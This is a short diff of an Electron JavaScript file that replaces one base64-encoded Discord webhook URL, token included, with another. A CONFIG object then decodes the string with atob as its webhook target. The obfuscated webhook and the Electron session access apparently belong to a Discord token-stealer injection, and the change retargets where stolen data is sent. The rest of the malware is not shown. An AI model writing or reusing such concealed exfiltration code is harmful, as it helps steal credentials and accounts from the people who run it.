@@ -10,7 +10,7 @@ const {
     session,
     app
 } = require('electron');
-const encodedHook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI0OTk4MTc3MjMxODYzODEzNC90dUhuc1dsdGppQnBZaUV6MGlzNWdEcjBNSjh2SklpZjE2bXdfOWF5eHZyNThyYWxzTExpczJyODNHMUFCdnNJMlZhRQ=='
+const encodedHook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI1MDAyNTQ1NjIwODQ0OTYyNi80MV9ldi1IZ05mY1VIajBLU29QT0dwVHpQLVB6ZE54TnZ1UUNCYl9GNnVaU2QycUVLZmlxNmRCUTItbk84UHUxa2hNUw=='
 
 const CONFIG = {
     webhook: atob(encodedHook),
